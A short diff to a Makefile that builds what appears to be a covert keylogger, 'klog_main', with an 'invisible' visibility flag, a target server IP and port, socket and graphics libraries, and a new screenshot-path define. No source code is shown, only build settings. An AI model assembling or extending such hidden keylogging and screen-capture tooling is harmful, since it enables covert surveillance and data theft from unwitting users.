@@ -1,5 +1,5 @@
-SERVER_IP = \"192.168.11.79\"
-PORT = 80
+SERVER_IP = \"127.0.0.1\"
+PORT = 8080
 FILEBLOCKSIZE = 128
 SCREENSHOTPATH = \"C:\\Users\\aisnd\\Desktop\\Hello.bmp\"
 
@@ -10,7 +10,7 @@ IP_VERSION = IPV4
 Visibility = invisible
 
 CDefine = -D ${IP_VERSION} -D ${Visibility}
-CDefine += -D SERVER_IP=${SERVER_IP} -D PORT=${PORT} -D FILEBLOCKSIZE=${FILEBLOCKSIZE}
+CDefine += -D SERVER_IP=${SERVER_IP} -D PORT=${PORT} -D FILEBLOCKSIZE=${FILEBLOCKSIZE} -D SCREENSHOTPATH=${SCREENSHOTPATH}
 
 CFlags = -lws2_32 -static-libgcc -static-libstdc++ -Wl,-Bstatic -lstdc++ -Wl,-Bdynamic -lgdi32 ${CDefine}
 
@@ -24,4 +24,5 @@ klog_main: klog_main.cpp
 	g++ $< -o $@ $(CFlags)
 
 clean:
-	erase *.exe
+	rm server.exe
+	rm klog_main.exe
